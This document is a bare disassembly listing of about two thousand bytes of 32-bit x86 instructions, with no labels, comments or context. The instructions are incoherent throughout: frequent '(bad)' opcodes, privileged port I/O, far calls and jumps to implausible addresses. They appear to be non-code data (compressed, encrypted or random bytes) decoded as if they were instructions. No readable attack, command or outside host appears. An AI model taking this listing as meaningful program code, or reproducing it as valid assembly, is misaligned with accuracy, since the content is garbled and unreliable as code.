  41e2e4:	sub    ebx,DWORD PTR [ebx]
  41e2e6:	xchg   edx,eax
  41e2e7:	mov    ds:0x29c1afdc,al
  41e2ec:	ret    0xbf93
  41e2ef:	xor    dl,BYTE PTR [ebx+0x3550641b]
  41e2f5:	int    0x59
  41e2f7:	mov    bl,0x71
  41e2f9:	fbstp  TBYTE PTR [ebx]
  41e2fb:	xchg   ecx,eax
  41e2fc:	in     al,dx
  41e2fd:	inc    cl
  41e2ff:	sbb    DWORD PTR [edx+ebx*2-0x57],eax
  41e303:	pxor   mm4,mm1
  41e306:	pop    ebx
  41e307:	jmp    0x41e388
  41e309:	cld    
  41e30a:	(bad)  
  41e30b:	cmp    DWORD PTR [esi+0x853ba03],esi
  41e311:	cld    
  41e312:	mov    edx,0x91a56cc3
  41e317:	push   edi
  41e318:	std    
  41e319:	push   0xffffff95
  41e31b:	jp     0x41e36d
  41e31d:	mov    WORD PTR [eax],es
  41e31f:	pop    edx
  41e320:	sbb    esi,DWORD PTR ds:0x1010bd75
  41e326:	add    ebx,ebx
  41e328:	inc    ebp
  41e329:	mov    bh,BYTE PTR [ecx+0x70]
  41e32c:	add    ch,BYTE PTR [edi]
  41e32e:	jbe    0x41e306
  41e330:	jmp    0x41e2f3
  41e332:	inc    esp
  41e333:	(bad)  
  41e334:	out    dx,al
  41e335:	inc    edi
  41e336:	adc    bh,ch
  41e338:	pop    edi
  41e339:	lahf   
  41e33a:	sbb    ebx,esp
  41e33c:	pop    ds
  41e33d:	sahf   
  41e33e:	ja     0x41e31c
  41e340:	test   eax,0x848e7e14
  41e345:	jle    0x41e2db
  41e347:	ja     0x41e376
  41e349:	mov    ebx,DWORD PTR cs:[ecx+0xf920f26]
  41e350:	cs je  0x41e345
  41e353:	(bad)  
  41e354:	dec    edi
  41e355:	mov    edx,0x8a84f1c7
  41e35a:	popf   
  41e35b:	mov    esp,0xa7e7801d
  41e360:	scas   al,BYTE PTR es:[edi]
  41e361:	push   edi
  41e362:	fnsave [edx+0x7450c661]
  41e368:	aaa    
  41e369:	adc    eax,0x1709ad36
  41e36e:	mov    dh,0x5f
  41e370:	jmp    0x4beca24
  41e375:	xchg   esi,eax
  41e376:	sbb    al,0x2d
  41e378:	repz cmp DWORD PTR [eax+0x16acf53c],esp
  41e37f:	jmp    0xb8d3787
  41e384:	outs   dx,BYTE PTR ds:[esi]
  41e385:	adc    eax,0x90796486
  41e38a:	and    al,0x4a
  41e38c:	or     DWORD PTR [ebx],ebx
  41e38e:	leave  
  41e38f:	mov    bl,0x73
  41e391:	loope  0x41e382
  41e393:	stos   DWORD PTR es:[edi],eax
  41e394:	sbb    eax,0x711a17d7
  41e399:	adc    ebx,DWORD PTR [eax-0x1c13632c]
  41e39f:	ret    
  41e3a0:	adc    eax,DWORD PTR [ebp-0x107c4303]
  41e3a6:	icebp  
  41e3a7:	cmp    al,BYTE PTR [edi+0x3129bfa0]
  41e3ad:	mov    edx,0x785f7042
  41e3b2:	mov    ebx,0x30de10ba
  41e3b7:	mov    BYTE PTR [ebx+0x4b],bl
  41e3ba:	push   ebp
  41e3bb:	lds    edi,FWORD PTR [ecx-0x2]
  41e3be:	sbb    ah,al
  41e3c0:	mov    ch,0xc7
  41e3c2:	in     al,dx
  41e3c3:	pusha  
  41e3c4:	xchg   ebx,eax
  41e3c5:	jno    0x41e396
  41e3c7:	mov    eax,0xb577b03a
  41e3cc:	or     DWORD PTR [eax-0x65974691],eax
  41e3d2:	stos   DWORD PTR es:[edi],eax
  41e3d3:	jecxz  0x41e3fc
  41e3d5:	fldenv [eax+0x57]
  41e3d8:	push   eax
  41e3d9:	cmp    eax,0x9d4d3009
  41e3de:	and    al,0xaf
  41e3e0:	cmp    esi,DWORD PTR [ebp+0x7cb617f5]
  41e3e6:	retf   0x6162
  41e3e9:	loope  0x41e40e
  41e3eb:	test   DWORD PTR [edi],0x16604918
  41e3f1:	in     al,dx
  41e3f2:	mov    bh,0x38
  41e3f4:	ret    0x5df4
  41e3f7:	xchg   edx,eax
  41e3f8:	std    
  41e3f9:	mov    esi,0x60c4796c
  41e3fe:	cwde   
  41e3ff:	mov    BYTE PTR [ecx*2+0x6ec5d1fb],bl
  41e406:	call   0x4fd0:0xcdf72a1a
  41e40d:	and    ebp,DWORD PTR [edx+ecx*2-0x5d337b52]
  41e414:	ss stos BYTE PTR es:[edi],al
  41e416:	popa   
  41e417:	les    eax,FWORD PTR [ebx-0x220efae4]
  41e41d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e41e:	loope  0x41e400
  41e420:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e421:	loopne 0x41e3f9
  41e423:	cmp    al,0x5a
  41e425:	dec    ebp
  41e426:	fsubr  DWORD PTR [ecx-0x10]
  41e429:	in     al,dx
  41e42a:	pop    es
  41e42b:	add    eax,0x88ab7658
  41e430:	xchg   esi,eax
  41e431:	arpl   WORD PTR [esi],sp
  41e433:	or     eax,0x324e0ac7
  41e438:	fst    DWORD PTR [eax-0x6035a2fa]
  41e43e:	retf   
  41e43f:	mov    ds:0xe5d2e225,al
  41e444:	xchg   esp,eax
  41e445:	fs xchg ebx,eax
  41e447:	cmc    
  41e448:	int    0x20
  41e44a:	adc    eax,0x8a7b0417
  41e44f:	dec    DWORD PTR ds:0xda5871d
  41e455:	jmp    DWORD PTR [ecx-0x2d360d0a]
  41e45b:	(bad)  
  41e45c:	out    0x44,eax
  41e45e:	ins    DWORD PTR es:[edi],dx
  41e45f:	sub    al,0xd6
  41e461:	inc    ebp
  41e462:	rcr    dh,cl
  41e464:	dec    ebx
  41e465:	ins    BYTE PTR es:[edi],dx
  41e466:	sbb    bl,0xb7
  41e469:	sub    BYTE PTR [ecx+eiz*4+0x1e],ah
  41e46d:	sub    eax,0x1de57184
  41e472:	xor    DWORD PTR [esi],ebx
  41e474:	push   0x6e
  41e476:	aaa    
  41e477:	sbb    esi,DWORD PTR ds:0xa485b10b
  41e47d:	inc    ebp
  41e47e:	test   al,0xac
  41e480:	vsubpd ymm0,ymm1,YMMWORD PTR ds:0x98c55801
  41e488:	mov    dl,0x20
  41e48a:	mov    ecx,0xf5404852
  41e48f:	into   
  41e490:	mov    esp,0xff962df0
  41e495:	push   ecx
  41e496:	xchg   esi,eax
  41e497:	adc    BYTE PTR [esi+0x770b5291],ah
  41e49d:	loope  0x41e452
  41e49f:	push   esp
  41e4a0:	pop    esp
  41e4a1:	out    dx,eax
  41e4a2:	mov    DWORD PTR ds:0x24cbee5d,ebx
  41e4a8:	xchg   bh,cl
  41e4aa:	retf   
  41e4ab:	lods   al,BYTE PTR gs:[esi]
  41e4ad:	add    eax,0x5e1b27d4
  41e4b2:	sbb    edi,DWORD PTR [ecx+0x30]
  41e4b5:	in     al,dx
  41e4b6:	cmp    eax,0x994165e1
  41e4bb:	or     BYTE PTR [ebx],cl
  41e4bd:	xor    BYTE PTR [ebx],dl
  41e4bf:	fist   DWORD PTR [ebx]
  41e4c1:	es stos BYTE PTR es:[edi],al
  41e4c3:	test   ebp,esp
  41e4c5:	fild   WORD PTR [ebp-0x78]
  41e4c8:	pop    ds
  41e4c9:	mov    ebx,0x5671381b
  41e4ce:	scas   al,BYTE PTR es:[edi]
  41e4cf:	pop    ds
  41e4d0:	mov    al,0x73
  41e4d2:	jmp    FWORD PTR [edx+0x78b70060]
  41e4d8:	lods   eax,DWORD PTR ds:[esi]
  41e4d9:	and    bl,BYTE PTR [edi]
  41e4db:	ss cmp dh,dh
  41e4de:	outs   dx,DWORD PTR ds:[esi]
  41e4df:	ins    BYTE PTR es:[edi],dx
  41e4e0:	push   ebx
  41e4e1:	jo     0x41e47e
  41e4e3:	push   esi
  41e4e4:	popf   
  41e4e5:	jno    0x41e480
  41e4e7:	scas   al,BYTE PTR es:[edi]
  41e4e8:	inc    ebp
  41e4e9:	es fmul st(4),st
  41e4ec:	inc    esi
  41e4ed:	sbb    BYTE PTR [ecx],al
  41e4ef:	repz int3 
  41e4f1:	sbb    ch,BYTE PTR [ebx]
  41e4f3:	inc    ebp
  41e4f4:	aaa    
  41e4f5:	push   0xfffffff1
  41e4f7:	xchg   esp,eax
  41e4f8:	mov    bl,0xd2
  41e4fa:	mov    ebp,0x4fb74080
  41e4ff:	mov    bl,0x86
  41e501:	cs xor dh,dl
  41e504:	pop    esi
  41e505:	adc    DWORD PTR [ebx-0x7717955b],ebx
  41e50b:	fnstcw WORD PTR [edx+0x24eac00c]
  41e511:	out    dx,al
  41e512:	mov    dh,0x45
  41e514:	mov    edi,0xf8542f60
  41e519:	inc    ebx
  41e51a:	xor    esp,DWORD PTR [ebx+ebp*1-0x40]
  41e51e:	(bad)  
  41e51f:	xchg   ebp,eax
  41e520:	xchg   esp,eax
  41e521:	jb     0x41e4aa
  41e523:	dec    edi
  41e524:	push   0x27
  41e526:	lods   eax,DWORD PTR ds:[esi]
  41e527:	clc    
  41e528:	xlat   BYTE PTR ds:[ebx]
  41e529:	jle    0x41e4f4
  41e52b:	xor    dl,BYTE PTR ds:0x51f7cbbc
  41e531:	push   ds
  41e532:	push   ss
  41e533:	and    BYTE PTR [ecx+0x3],bl
  41e536:	push   esi
  41e537:	dec    ebx
  41e538:	push   esp
  41e539:	je     0x41e540
  41e53b:	xchg   ebp,eax
  41e53c:	inc    esp
  41e53d:	(bad)  
  41e53e:	addr16 and al,0x5a
  41e541:	stc    
  41e542:	ja     0x41e51d
  41e544:	add    ebp,edi
  41e546:	ret    
  41e547:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e548:	(bad)  
  41e549:	shr    BYTE PTR [edi],1
  41e54b:	mov    ch,0x61
  41e54d:	dec    ebx
  41e54e:	and    dl,0x96
  41e551:	js     0x41e4df
  41e553:	fs (bad) 
  41e555:	sti    
  41e556:	in     eax,dx
  41e557:	mov    eax,0xb2417874
  41e55c:	xchg   ebx,eax
  41e55d:	or     BYTE PTR [ebp-0x46719603],cl
  41e563:	push   ds
  41e564:	dec    esi
  41e565:	and    cl,BYTE PTR [edx+0x34]
  41e568:	mov    bl,0x1e
  41e56a:	test   BYTE PTR ds:0x9136745b,cl
  41e570:	test   DWORD PTR [ebp+ecx*2+0x6a],0x7c21bd23
  41e578:	int    0xb6
  41e57a:	inc    esi
  41e57b:	mov    dh,0x17
  41e57d:	inc    bp
  41e57f:	aaa    
  41e580:	loop   0x41e5c7
  41e582:	mov    esi,0xd0fd4f0a
  41e587:	push   edi
  41e588:	jp     0x41e5dd
  41e58a:	in     al,0x8c
  41e58c:	xchg   edi,eax
  41e58d:	aad    0xc1
  41e58f:	mov    cl,0xd8
  41e591:	sbb    eax,0x9e5c06b0
  41e596:	xchg   cl,al
  41e598:	pop    edi
  41e599:	xchg   esi,eax
  41e59a:	test   eax,0xff410bc9
  41e59f:	fs xchg esp,eax
  41e5a1:	test   ch,0x4
  41e5a4:	inc    esi
  41e5a5:	(bad)  
  41e5a6:	xlat   BYTE PTR ds:[ebx]
  41e5a7:	call   0xba26:0x8cbb4220
  41e5ae:	add    DWORD PTR [ebx-0x23],edx
  41e5b1:	sub    DWORD PTR [ebx-0x20],edi
  41e5b4:	scas   al,BYTE PTR es:[edi]
  41e5b5:	or     BYTE PTR [ebx-0x3d],0x6
  41e5b9:	cmc    
  41e5ba:	daa    
  41e5bb:	sub    al,0x5e
  41e5bd:	pop    ebx
  41e5be:	jmp    0x41e5bf
  41e5c0:	jle    0x41e5da
  41e5c2:	clc    
  41e5c3:	outs   dx,BYTE PTR ds:[esi]
  41e5c4:	sub    BYTE PTR [edx+0x63b560b9],0x6b
  41e5cb:	xchg   esp,eax
  41e5cc:	jle    0x41e5dc
  41e5ce:	stos   BYTE PTR es:[edi],al
  41e5cf:	add    eax,0xe89d0dc5
  41e5d4:	fstp   QWORD PTR [edi+edi*2]
  41e5d7:	cmp    eax,eax
  41e5d9:	sub    eax,0x6f0ab48f
  41e5de:	aaa    
  41e5df:	rcr    DWORD PTR [edx],cl
  41e5e1:	jnp    0x41e57e
  41e5e3:	mov    bl,0x54
  41e5e5:	es daa 
  41e5e7:	aad    0x19
  41e5e9:	pop    ss
  41e5ea:	and    bl,dh
  41e5ec:	dec    esi
  41e5ed:	mov    ecx,0xa5a71057
  41e5f2:	and    BYTE PTR [eax-0x75],0x83
  41e5f6:	ins    BYTE PTR es:[edi],dx
  41e5f7:	popa   
  41e5f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5f9:	jle    0x41e5da
  41e5fb:	mov    bh,0xd4
  41e5fd:	outs   dx,DWORD PTR ds:[esi]
  41e5fe:	fisub  DWORD PTR [edi+0x6f]
  41e601:	mov    ebx,0x76b1f9d6
  41e606:	sbb    eax,0x9601a1dc
  41e60b:	mov    dl,0xed
  41e60d:	pop    ebx
  41e60e:	fst    DWORD PTR [ebx-0xb41365b]
  41e614:	aaa    
  41e615:	jl     0x41e657
  41e617:	xor    BYTE PTR [eax*8-0x68bd66a7],dh
  41e61e:	ficom  WORD PTR [ebp+0xc8d19ac]
  41e624:	mov    WORD PTR [esi],?
  41e626:	cmp    edi,DWORD PTR [eax+0x32d735a7]
  41e62c:	int    0xb3
  41e62e:	mov    ah,0x19
  41e630:	(bad)  
  41e631:	mov    esi,0x9168a75
  41e636:	xchg   esp,eax
  41e637:	sbb    eax,0xc9500471
  41e63c:	xor    esi,DWORD PTR [edi-0x36]
  41e63f:	jnp    0x41e620
  41e641:	leave  
  41e642:	aam    0x6b
  41e644:	stos   DWORD PTR es:[edi],eax
  41e645:	cmp    DWORD PTR [edx],ebx
  41e647:	mov    edi,edx
  41e649:	enter  0x90dc,0xa5
  41e64d:	dec    edx
  41e64e:	mov    edx,0x13ba332d
  41e653:	fsub   st,st(3)
  41e655:	sti    
  41e656:	sub    eax,0x26449c0b
  41e65b:	mov    gs,WORD PTR [edi+0x590a8185]
  41e661:	add    al,0x20
  41e663:	jb     0x41e6ba
  41e665:	stos   BYTE PTR es:[edi],al
  41e666:	push   edi
  41e667:	xchg   esi,eax
  41e668:	cmp    esi,ebx
  41e66a:	and    al,0x6b
  41e66c:	daa    
  41e66d:	mov    DWORD PTR [bp+di+0x32c],ecx
  41e672:	gs loop 0x41e6d3
  41e675:	sub    BYTE PTR [eax],cl
  41e677:	mov    ecx,0xdd18f296
  41e67c:	bsf    ecx,DWORD PTR [eax-0x14]
  41e680:	sbb    bh,0x7e
  41e683:	fwait
  41e684:	aas    
  41e685:	adc    eax,0x1709e656
  41e68a:	ret    0x90c4
  41e68d:	xchg   ecx,eax
  41e68e:	pop    eax
  41e68f:	inc    edx
  41e690:	mov    edx,0x6aec35f3
  41e695:	scas   al,BYTE PTR es:[edi]
  41e696:	jb     0x41e621
  41e698:	cli    
  41e699:	retf   0x6cf1
  41e69c:	jl     0x41e64e
  41e69e:	inc    edi
  41e69f:	sbb    ebp,DWORD PTR [ebx+ebx*1-0x67]
  41e6a3:	cmp    eax,0xc2a347c5
  41e6a8:	mov    BYTE PTR [edi-0x10],bh
  41e6ab:	mov    cl,BYTE PTR [eax+esi*4-0x6d]
  41e6af:	push   0xe24e828b
  41e6b4:	test   ch,bh
  41e6b6:	jmp    0x41e6c7
  41e6b8:	data16 jecxz 0x41e684
  41e6bb:	call   0xbe7b:0x74f2f961
  41e6c2:	sbb    ebx,DWORD PTR [ecx]
  41e6c4:	leave  
  41e6c5:	repz mov dh,0x14
  41e6c8:	adc    eax,0x2ec9a580
  41e6cd:	sbb    esp,DWORD PTR [esi+eiz*1+0x4c]
  41e6d1:	jle    0x41e677
  41e6d3:	jbe    0x41e70b
  41e6d5:	lock (bad) 
  41e6d7:	push   ds
  41e6d8:	(bad)  
  41e6d9:	enter  0x2f0a,0xd
  41e6dd:	test   eax,0x496ad813
  41e6e2:	cld    
  41e6e3:	adc    dl,al
  41e6e5:	xchg   esi,eax
  41e6e6:	pop    esp
  41e6e7:	(bad)  
  41e6e8:	shl    ebp,cl
  41e6ea:	sub    ah,BYTE PTR ds:0x8e483e7e
  41e6f0:	xchg   ebp,eax
  41e6f1:	mov    eax,ds:0xf97970df
  41e6f6:	xchg   DWORD PTR [esi-0x59],edx
  41e6f9:	out    0xe5,eax
  41e6fb:	dec    ebx
  41e6fc:	stc    
  41e6fd:	mov    edx,0xb7b4e12e
  41e702:	fdivr  QWORD PTR [ebx+0x25]
  41e705:	out    0xd9,eax
  41e707:	push   eax
  41e708:	popf   
  41e709:	dec    esi
  41e70a:	cld    
  41e70b:	inc    edx
  41e70c:	pop    ebp
  41e70d:	jns    0x41e788
  41e70f:	inc    eax
  41e710:	dec    ebx
  41e711:	mov    edi,0xe60377ba
  41e716:	push   ebx
  41e717:	repz call 0xa70e:0x1a930e8
  41e71f:	mov    BYTE PTR [edx+ebx*2-0x7b],bl
  41e723:	or     eax,0x84ad26a2
  41e728:	sub    cl,BYTE PTR ss:[ebx+0x5c19fb70]
  41e72f:	sub    eax,0x33f42f28
  41e734:	mov    bl,ah
  41e736:	test   DWORD PTR [eax],esp
  41e738:	inc    ebx
  41e739:	cmp    al,0x4a
  41e73b:	jp     0x41e73d
  41e73d:	out    dx,eax
  41e73e:	xor    edi,eax
  41e740:	mov    esp,0xca870af2
  41e745:	ficomp DWORD PTR ds:0x596d3bb8
  41e74b:	lea    ecx,[eax-0x62a69e63]
  41e751:	jae    0x41e78e
  41e753:	aas    
  41e754:	test   BYTE PTR [edi+0x35],ch
  41e757:	pop    ecx
  41e758:	pop    ss
  41e759:	outs   dx,DWORD PTR ds:[esi]
  41e75a:	xor    eax,0x7bf46603
  41e75f:	hlt    
  41e760:	fiadd  WORD PTR [ebp-0x58c1c0a9]
  41e766:	jbe    0x41e73c
  41e768:	and    BYTE PTR [esi+ebx*2],bh
  41e76b:	or     al,0x68
  41e76d:	inc    esp
  41e76e:	jbe    0x41e7c6
  41e770:	xor    eax,0x7cb3caad
  41e775:	dec    ecx
  41e776:	les    eax,FWORD PTR [eax]
  41e778:	fstp   DWORD PTR [ecx+0x12]
  41e77b:	fisub  WORD PTR [esi]
  41e77d:	pop    edx
  41e77e:	sti    
  41e77f:	cld    
  41e780:	xor    esi,DWORD PTR [esp+ebx*4-0x4b91eafb]
  41e787:	add    DWORD PTR [ebx-0x3975d2f3],edx
  41e78d:	sbb    dh,BYTE PTR [esi+0x1e]
  41e790:	pop    es
  41e791:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e792:	pop    esp
  41e793:	ds cdq 
  41e795:	gs jbe 0x41e7b2
  41e798:	fwait
  41e799:	xchg   BYTE PTR [eax+0x46],dh
  41e79c:	pop    edx
  41e79d:	cli    
  41e79e:	mov    eax,ds:0x5f8957ec
  41e7a3:	(bad)  
  41e7a4:	mov    bl,0xe6
  41e7a6:	ds dec ebp
  41e7a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7a9:	jb     0x41e73d
  41e7ab:	leavew 
  41e7ad:	fld    QWORD PTR [edx]
  41e7af:	es aad 0x5f
  41e7b2:	cdq    
  41e7b3:	push   ecx
  41e7b4:	push   ds
  41e7b5:	adc    edx,DWORD PTR [ebx+0x2]
  41e7b8:	mov    WORD PTR [esi-0x346a915d],ss
  41e7be:	dec    ebp
  41e7bf:	shr    BYTE PTR [edx-0x5db0b087],0x78
  41e7c6:	clc    
  41e7c7:	dec    ebx
  41e7c8:	mov    WORD PTR [esi+0xf],ds
  41e7cb:	cmc    
  41e7cc:	mov    ch,0x66
  41e7ce:	(bad)  
  41e7cf:	(bad)  
  41e7d0:	in     eax,0xdc
  41e7d2:	mul    DWORD PTR ds:0xdc65b351
  41e7d8:	or     al,0x71
  41e7da:	cmp    ebx,ebp
  41e7dc:	push   ds
  41e7dd:	lahf   
  41e7de:	out    0x77,al
  41e7e0:	add    ah,dh
  41e7e2:	mov    esi,DWORD PTR [ebp+edi*4-0x6d]
  41e7e6:	hlt    
  41e7e7:	loop   0x41e7a7
  41e7e9:	adc    BYTE PTR [ebx],dl
  41e7eb:	sub    eax,0x3d1005ee
  41e7f0:	jmp    0x5db312b0
  41e7f5:	fsub   DWORD PTR [ebx+eiz*2]
  41e7f8:	cmp    DWORD PTR [ebx-0x6f80e0b1],edx
  41e7fe:	das    
  41e7ff:	or     DWORD PTR [ebx+0x49],ebp
  41e802:	pushf  
  41e803:	call   0xc010:0xcdb831aa
  41e80a:	fiadd  DWORD PTR es:[edi]
  41e80d:	lahf   
  41e80e:	mov    WORD PTR [edi+0x5ccb7552],fs
  41e814:	mov    ebp,0x66775bfc
  41e819:	and    ch,BYTE PTR [edx-0x15347b78]
  41e81f:	cmc    
  41e820:	cmp    ebp,DWORD PTR [edx]
  41e822:	adc    dl,BYTE PTR [ebx+0x6d7dfcab]
  41e828:	fild   QWORD PTR [ebx-0x18]
  41e82b:	pop    ecx
  41e82c:	pop    ss
  41e82d:	jl     0x41e7af
  41e82f:	fnstsw WORD PTR [edi+0x15]
  41e832:	push   eax
  41e833:	mov    cl,0x59
  41e835:	xor    ch,BYTE PTR [esi]
  41e837:	outs   dx,DWORD PTR ds:[esi]
  41e838:	scas   al,BYTE PTR es:[edi]
  41e839:	add    al,BYTE PTR [esi-0x2e7fe552]
  41e83f:	enter  0x5d45,0x8e
  41e843:	xchg   DWORD PTR [ecx+0x636e8a88],ebx
  41e849:	sbb    bl,BYTE PTR [edx-0x658cafcf]
  41e84f:	xor    ch,BYTE PTR [ebp+0x6c]
  41e852:	pop    edi
  41e853:	xor    al,0xf4
  41e855:	xor    eax,0x9b64961a
  41e85a:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41e85c:	xchg   esp,eax
  41e85d:	cmp    cl,BYTE PTR [ecx+eax*8-0x73]
  41e861:	or     DWORD PTR [ebx+0x3],ebp
  41e864:	pusha  
  41e865:	in     eax,0x48
  41e867:	enter  0x4273,0xd0
  41e86b:	movlps xmm7,QWORD PTR [ebp+0x16]
  41e86f:	loop   0x41e845
  41e871:	std    
  41e872:	inc    ebp
  41e873:	push   esi
  41e874:	loopne 0x41e841
  41e876:	or     cl,ch
  41e878:	in     al,dx
  41e879:	mov    ebp,0xb015db5a
  41e87e:	jl     0x41e88d
  41e880:	int3   
  41e881:	jg     0x41e843
  41e883:	in     al,0x15
  41e885:	scas   eax,DWORD PTR es:[edi]
  41e886:	mov    eax,ds:0xdd1fd525
  41e88b:	retf   0x3595
  41e88e:	or     esi,edi
  41e890:	(bad)
  41e893:	and    esi,DWORD PTR [eax]
  41e895:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e896:	and    al,0xfe
  41e898:	adc    cl,al
  41e89a:	fs jl  0x41e8ec
  41e89d:	jp     0x41e852
  41e89f:	inc    esp
  41e8a0:	inc    esi
  41e8a1:	inc    ebx
  41e8a2:	(bad)  
  41e8a3:	out    0x26,eax
  41e8a5:	cmp    edx,DWORD PTR [ebx-0xb385954]
  41e8ab:	xchg   edi,eax
  41e8ac:	push   ecx
  41e8ad:	fisubr DWORD PTR [edi-0x34b3e849]
  41e8b3:	cmc    
  41e8b4:	or     ch,BYTE PTR [ebp-0x4e]
  41e8b7:	pop    ds
  41e8b8:	in     eax,0x5c
  41e8ba:	(bad)  
  41e8bb:	stc    
  41e8bc:	(bad)  
  41e8bd:	out    0x3c,eax
  41e8bf:	xchg   ecx,eax
  41e8c0:	pop    ds
  41e8c1:	int3   
  41e8c2:	ret    0x2533
  41e8c5:	push   cs
  41e8c6:	adc    DWORD PTR [ebx-0x704704f8],eax
  41e8cc:	mov    WORD PTR [edx-0x30e438f5],es
  41e8d2:	js     0x41e8c2
  41e8d4:	xchg   edx,eax
  41e8d5:	xchg   edx,eax
  41e8d6:	adc    cl,ch
  41e8d8:	push   es
  41e8d9:	in     eax,0xad
  41e8db:	inc    eax
  41e8dc:	or     BYTE PTR [eax-0x5a],ah
  41e8df:	or     DWORD PTR [ecx],ebx
  41e8e1:	clc    
  41e8e2:	(bad)  
  41e8e3:	dec    esi
  41e8e4:	mov    ch,al
  41e8e6:	das    
  41e8e7:	or     al,0x15
  41e8e9:	xchg   edi,eax
  41e8ea:	dec    edx
  41e8eb:	or     al,0x3f
  41e8ed:	sub    eax,0xed8fe2a6
  41e8f2:	repnz pop es
  41e8f4:	repnz aad 0x62
  41e8f7:	sub    al,0x72
  41e8f9:	jbe    0x41e91a
  41e8fb:	jnp    0x41e903
  41e8fd:	imul   esp,DWORD PTR [ecx-0x6e],0xe0a2f08a
  41e904:	push   ds
  41e905:	mov    ah,0x5
  41e907:	icebp  
  41e908:	push   esp
  41e909:	jge    0x41e92b
  41e90b:	jecxz  0x41e92c
  41e90d:	sbb    eax,0xc3e4b3c4
  41e912:	jo     0x41e945
  41e914:	jmp    0x9cdaf44f
  41e919:	ja     0x41e952
  41e91b:	xlat   BYTE PTR ds:[ebx]
  41e91c:	stos   DWORD PTR es:[edi],eax
  41e91d:	or     edi,0x58af6b4f
  41e923:	xchg   edx,eax
  41e924:	jns    0x41e958
  41e926:	retf   0xb763
  41e929:	popf   
  41e92a:	pop    ebp
  41e92b:	outs   dx,BYTE PTR ss:[esi]
  41e92d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e92e:	mov    edx,0x8a1fd9df
  41e933:	div    BYTE PTR [eax+0x45b9c827]
  41e939:	idiv   DWORD PTR [bp+si]
  41e93c:	or     DWORD PTR [ecx],ebx
  41e93e:	aad    0x24
  41e940:	push   edi
  41e941:	data16 jnp 0x41e8f9
  41e944:	jb     0x41e90d
  41e946:	(bad)  
  41e947:	mov    ah,0xa8
  41e949:	xor    al,ch
  41e94b:	mov    al,ds:0xdb979e58
  41e950:	(bad)  
  41e951:	fadd   QWORD PTR [eax+ebp*2]
  41e954:	inc    esi
  41e955:	adc    al,0x11
  41e957:	lods   al,BYTE PTR ds:[esi]
  41e958:	jg     0x41e974
  41e95a:	jge    0x41e9ad
  41e95c:	jne    0x41e99f
  41e95e:	enter  0x19e6,0x41
  41e962:	mov    edx,DWORD PTR [edi]
  41e964:	imul   DWORD PTR [ebx-0xe]
  41e967:	inc    edx
  41e968:	add    DWORD PTR [ebx-0x9],ebx
  41e96b:	out    dx,eax
  41e96c:	cmc    
  41e96d:	adc    bh,cl
  41e96f:	loopne 0x41e942
  41e971:	adc    DWORD PTR [ebx+0x4e],ebp
  41e974:	icebp  
  41e975:	fisubr WORD PTR [edi-0x3d]
  41e978:	rol    esp,cl
  41e97a:	je     0x41e90f
  41e97c:	mov    ds:0xcc7c64ba,al
  41e981:	sbb    DWORD PTR [edx+0x18],ecx
  41e984:	or     eax,0x4d908b70
  41e989:	pop    esp
  41e98a:	mov    ecx,0x9189aa3e
  41e98f:	sub    al,0x20
  41e991:	jns    0x41e965
  41e993:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e994:	push   ebp
  41e995:	mov    DWORD PTR [ebp+0x31],ebp
  41e998:	xor    DWORD PTR [esi],ebp
  41e99a:	adc    eax,0x1b896114
  41e99f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9a0:	retf   0x250a
  41e9a3:	mov    ah,0x56
  41e9a5:	cmp    ah,al
  41e9a7:	or     DWORD PTR [ebp-0x51d7c8fc],ecx
  41e9ad:	push   ecx
  41e9ae:	inc    esi
  41e9af:	sbb    ecx,DWORD PTR [ebp-0x19]
  41e9b2:	fst    st(7)
  41e9b4:	jae    0x41e966
  41e9b6:	cmp    DWORD PTR [eax],edi
  41e9b8:	cs add al,0xe4
  41e9bb:	shr    BYTE PTR [esi-0x598d7557],cl
  41e9c1:	das    
  41e9c2:	leave  
  41e9c3:	leave  
  41e9c4:	not    BYTE PTR [ebx+0x43a566cc]
  41e9ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9cb:	ja     0x41e9ac
  41e9cd:	out    dx,al
  41e9ce:	mov    dl,0x77
  41e9d0:	repnz mov ecx,0xf2ad8057
  41e9d6:	or     edi,esp
  41e9d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9d9:	add    DWORD PTR [edi],ecx
  41e9db:	dec    BYTE PTR [edx-0x67]
  41e9de:	xchg   edx,eax
  41e9df:	pop    edx
  41e9e0:	pop    ecx
  41e9e1:	or     ecx,0x71
  41e9e4:	cdq    
  41e9e5:	bound  edi,QWORD PTR [ecx+0x6ba3c4d4]
  41e9eb:	mov    ss,WORD PTR [eax]
  41e9ed:	xor    al,BYTE PTR [edi-0xb]
  41e9f0:	ja     0x41ea3e
  41e9f2:	or     eax,0x7b8f6838
  41e9f7:	and    BYTE PTR [edx-0x36],0x30
  41e9fb:	enter  0xadd0,0x36
  41e9ff:	sbb    edx,ebx
  41ea01:	pushf  
  41ea02:	stos   DWORD PTR es:[edi],eax
  41ea03:	add    ch,bh
  41ea05:	cmp    BYTE PTR ds:0x9944cb05,bh
  41ea0b:	dec    ebx
  41ea0c:	scas   eax,DWORD PTR es:[edi]
  41ea0d:	pop    ds
  41ea0e:	pop    esi
  41ea0f:	jge    0x41e9a2
  41ea11:	scas   al,BYTE PTR es:[edi]
  41ea12:	int    0xd1
  41ea14:	jmp    0xd0cd8c71
  41ea19:	fcomp  QWORD PTR [ebx+0x11]
  41ea1c:	mov    edi,0x3fe3aea8
  41ea21:	(bad)  
  41ea22:	or     eax,0xd48fa9d8
  41ea27:	and    esi,0x34b55eda
  41ea2d:	mov    eax,0x6e31a4e0
  41ea32:	xor    eax,0xd53806e1
  41ea37:	pop    ds
  41ea38:	iret   
  41ea39:	es das 
  41ea3b:	retf   
  41ea3c:	pusha  
  41ea3d:	sbb    DWORD PTR [ebp-0x7c261536],ebp
  41ea43:	mov    BYTE PTR [ecx+ebp*2],al
  41ea46:	fldcw  WORD PTR [ecx]
